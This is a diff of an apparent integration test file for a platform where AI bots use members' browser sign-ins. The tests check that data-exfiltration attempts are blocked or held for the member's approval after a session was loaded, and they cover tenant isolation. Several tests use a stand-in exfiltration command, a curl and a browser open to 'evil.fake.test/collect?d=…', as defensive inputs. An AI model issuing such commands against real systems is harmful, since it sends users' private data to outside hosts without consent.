@@ -3,6 +3,7 @@ import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { type TestClient, WEB_ORIGIN } from "../../testing";
 import { codeOf, type Json, ok, type Res, type SandboxStack, startSandboxStack } from "../../testing-sandbox";
 import { startTestStorage, type TestStorage } from "../../testing-storage";
+import { recordMemberData, stickyMemberData } from "../bot-capabilities";
 import { keepForSite, sealSession } from "../browser/sessions";
 import { createConversationAccess } from "../chat";
 import { audienceCoverFacts, audienceCovers, createPermissionService } from "../organization";
@@ -239,13 +240,45 @@ describe("a team bot that used Sam's sign-in cannot put what it saw into its sha
     expect((await turnRow(ev.eventId)).sandbox_calls).toBe(4);
   });
 
-  it("a new turn without a loaded session writes again", async () => {
+  it("a later turn of Ops in Sam's DM keeps the member data (sticky per bot and conversation, #292); Ops in Alex's DM writes", async () => {
+    // The bot's history in Sam's DM may hold what it read signed in: no write, delete or exec there, ever again.
     const ev = await s.turnOf(s.sam, ops.dm, ops.id);
-    expect((await turnRow(ev.eventId)).member_data).toBe(false);
-    const w = await ok(
-      sandbox("write", ev, ops.id, { path: "notes/later.txt", content: "fine", mode: "overwrite" }),
+    expect((await turnRow(ev.eventId)).member_data).toBe(true);
+    const writesBefore = fakeCalls("filesWrite");
+    const w = await sandbox("write", ev, ops.id, {
+      path: "notes/later.txt",
+      content: "orders",
+      mode: "overwrite",
+    });
+    expect(w.status).toBe(403);
+    expect(codeOf(w)).toBe("member_data");
+    const del = await sandbox("delete", ev, ops.id, { path: "notes/old.txt" });
+    expect(codeOf(del)).toBe("member_data");
+    expect(fakeCalls("filesWrite")).toBe(writesBefore);
+    await ok(sandbox("read", ev, ops.id, { path: "notes/old.txt" }));
+    const sticky = (
+      await s.su.query(
+        "select sites, first_event_id from app.agent_member_data where agent_id = $1 and conversation_id = $2",
+        [ops.id, ops.dm],
+      )
+    ).rows;
+    expect(sticky).toHaveLength(1);
+    expect(sticky[0].sites).toEqual([HOST]);
+
+    // Another conversation of the same bot never loaded a session: its turns are as before.
+    const alexDm = (
+      await ok(
+        s.alex.request("POST", "/api/v1/dms", {
+          participants: [{ kind: "agent", id: ops.id }],
+        }) as Promise<Res>,
+      )
+    ).id as string;
+    const other = await s.turnOf(s.alex, alexDm, ops.id);
+    expect((await turnRow(other.eventId)).member_data).toBe(false);
+    const fine = await ok(
+      sandbox("write", other, ops.id, { path: "notes/later.txt", content: "fine", mode: "overwrite" }),
     );
-    expect(w).toMatchObject({ path: "notes/later.txt", size: 4 });
+    expect(fine).toMatchObject({ path: "notes/later.txt", size: 4 });
   });
 
   it("Sam's personal bot in the same situation writes, runs and deletes (its workspace is Sam's alone)", async () => {
@@ -395,14 +428,15 @@ describe("a download lands where its audience allows (F-8, P-11)", () => {
   });
 
   it("without a session: `downloads/report.csv` in the bot's workspace, then a free name; audited by path hash only", async () => {
-    // The signed-in page of the previous test is still open for (Scout, Sam's DM, Sam): the bot closes it first.
-    const closing = await s.turnOf(s.sam, scout.dm, scout.id);
-    await ok(browser("close", closing, scout.id));
-    const ev = await s.turnOf(s.sam, scout.dm, scout.id);
-    await ok(browser("open", ev, scout.id, { url: "https://docs.fake.test/files" }));
+    // Sam's DM with Scout loaded his session in the previous test: its turns keep member data from now on (sticky,
+    // #292). A bot that never loaded a session in its conversation shows the plain rule.
+    const docs = await s.newBot(`Docs ${randomUUID().slice(0, 4)}`);
+    await setCaps(docs.id);
+    const ev = await s.turnOf(s.sam, docs.dm, docs.id);
+    await ok(browser("open", ev, docs.id, { url: "https://docs.fake.test/files" }));
     expect((await turnRow(ev.eventId)).member_data).toBe(false);
     const importsBefore = fakeCalls("filesImport");
-    const first = await ok(browser("act", ev, scout.id, { action: "click", ref: "download-link" }));
+    const first = await ok(browser("act", ev, docs.id, { action: "click", ref: "download-link" }));
     expect(first.download).toEqual({
       stored: "workspace",
       name: "report.csv",
@@ -410,9 +444,9 @@ describe("a download lands where its audience allows (F-8, P-11)", () => {
       path: "downloads/report.csv",
     });
     expect(fakeCalls("filesImport")).toBe(importsBefore + 1);
-    const second = await ok(browser("act", ev, scout.id, { action: "click", ref: "download-link" }));
+    const second = await ok(browser("act", ev, docs.id, { action: "click", ref: "download-link" }));
     expect(second.download.path).toBe("downloads/report-2.csv");
-    const read = await ok(sandbox("read", ev, scout.id, { path: "downloads/report.csv" }));
+    const read = await ok(sandbox("read", ev, docs.id, { path: "downloads/report.csv" }));
     expect(read.content).toBe(DOWNLOADED);
 
     const stored = await auditOf("browser.download_stored", ev.eventId);
@@ -735,19 +769,27 @@ describe("D-13: after Sam's sign-in was used, nothing leaves for another host wi
     expect(await egressMode()).toBe("allowlist");
   });
 
-  it("5. a new turn without a loaded session: exec under `allowlist` and an open to any host need no D-13 approval", async () => {
+  it("5. a later turn in Sam's DM with Scout, with no page open, keeps member data (#292): exec under `allowlist` and an open of another host ask Sam; the loaded site opens without asking", async () => {
     const closing = await s.turnOf(s.sam, scout.dm, scout.id);
     await ok(browser("close", closing, scout.id));
     const ev = await s.turnOf(s.sam, scout.dm, scout.id);
-    expect((await turnRow(ev.eventId)).member_data).toBe(false);
-    await ok(sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] }));
-    const away = await ok(browser("open", ev, scout.id, { url: "https://evil.fake.test/x" }));
-    expect(away.host).toBe("evil.fake.test");
-    const asked = await s.su.query(
-      "select count(*)::int as n from app.tool_call_approvals where event_id = $1",
-      [ev.eventId],
-    );
-    expect(asked.rows[0].n).toBe(0);
+    expect((await turnRow(ev.eventId)).member_data).toBe(true);
+    const execBefore = fakeCalls("exec");
+    const navBefore = fakeCalls("contextNavigate");
+    const r = await sandbox("exec", ev, scout.id, {
+      argv: ["curl", "https://evil.fake.test/collect?d=later"],
+    });
+    expect(codeOf(r)).toBe("approval_required");
+    const away = await browser("open", ev, scout.id, { url: "https://evil.fake.test/collect?d=later" });
+    expect(away.status).toBe(409);
+    expect(codeOf(away)).toBe("approval_required");
+    const v = await view(s.sam, away.body?.error.details.approval.id as string);
+    expect(v.view.title).toBe("Open evil.fake.test");
+    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
+    expect(fakeCalls("exec")).toBe(execBefore);
+    expect(fakeCalls("contextNavigate")).toBe(navBefore);
+    const home = await ok(browser("open", ev, scout.id, { url: `https://${HOST}/reports` }));
+    expect(home).toMatchObject({ host: HOST, signedIn: true });
     await ok(browser("close", ev, scout.id));
   });
 
@@ -774,5 +816,73 @@ describe("D-13: after Sam's sign-in was used, nothing leaves for another host wi
     const v = await view(s.sam, r.body?.error.details.approval.id as string);
     expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
     expect(v.view.approverLabel).toBe("Waiting for Sam Lee to approve");
+  });
+});
+
+// ---------------------------------------------------------------- 07.8-28: sticky member data (WINDOWS #292, ADR-0029)
+
+describe("member data is sticky per (bot, conversation) once a member session was loaded there (#292)", () => {
+  it("Sam revokes Scout's session: Scout's DM stays sticky; its next page opens signed out but locked to its host, and the Export link to evil.fake.test asks Sam", async () => {
+    const [session] = (
+      await s.su.query("select id from app.browser_sessions where agent_id = $1 and user_id = $2", [
+        scout.id,
+        s.samId,
+      ])
+    ).rows as Json[];
+    await ok(s.sam.request("DELETE", `/api/v1/browser-sessions/${session?.id}`) as Promise<Res>, 204);
+    const ev = await s.turnOf(s.sam, scout.dm, scout.id);
+    expect((await turnRow(ev.eventId)).member_data).toBe(true);
+    const opened = await ok(browser("open", ev, scout.id, { url: `https://${HOST}/reports` }));
+    expect(opened).toMatchObject({ host: HOST, signedIn: false });
+    const contextId = opened.contextId as string;
+    expect(fakeContext(contextId)).toMatchObject({ siteLock: HOST, loadedState: false });
+
+    const click = await browser("act", ev, scout.id, { action: "click", ref: "export-link" });
+    expect(click.status).toBe(409);
+    expect(codeOf(click)).toBe("approval_required");
+    const v = await view(s.sam, click.body?.error.details.approval.id as string);
+    expect(v.view.title).toBe("Open evil.fake.test");
+    // The lock stopped the link: the page stayed on the site.
+    expect(fakeContext(contextId)?.host).toBe(HOST);
+    await ok(browser("close", ev, scout.id));
+  });
+
+  it("the turn row and the pair are written in the turn's own organization: organization B's tenant neither sees nor writes organization A's pair", async () => {
+    const core = s.stack.built.core;
+    const pair = { agentId: scout.id, conversationId: scout.dm };
+    const inA = await core.db.withTenant({ organizationId: s.orgA, userId: s.samId }, (tx) =>
+      stickyMemberData(tx, pair),
+    );
+    expect(inA?.sites).toEqual([HOST]);
+    const inB = await core.db.withTenant({ organizationId: s.orgB, userId: s.eveId }, (tx) =>
+      stickyMemberData(tx, pair),
+    );
+    expect(inB).toBeNull();
+    // Org A's bot and conversation do not exist in org B (composite FKs): nothing is written there.
+    await expect(
+      core.db.withTenant({ organizationId: s.orgB, userId: s.eveId }, (tx) =>
+        recordMemberData(tx, { ...pair, eventId: randomUUID(), site: "evil.fake.test" }),
+      ),
+    ).rejects.toThrow();
+    const rows = (
+      await s.su.query("select organization_id, sites from app.agent_member_data where agent_id = $1", [
+        scout.id,
+      ])
+    ).rows as Json[];
+    expect(rows).toEqual([{ organization_id: s.orgA, sites: [HOST] }]);
+  });
+
+  it("the pair goes with the bot's history: deleting the conversation removes it (cascade)", async () => {
+    const before = await s.su.query(
+      "select count(*)::int as n from app.agent_member_data where conversation_id = $1",
+      [ops.dm],
+    );
+    expect(before.rows[0].n).toBe(1);
+    await s.su.query("delete from app.conversations where id = $1", [ops.dm]);
+    const after = await s.su.query(
+      "select count(*)::int as n from app.agent_member_data where conversation_id = $1",
+      [ops.dm],
+    );
+    expect(after.rows[0].n).toBe(0);
   });
 });
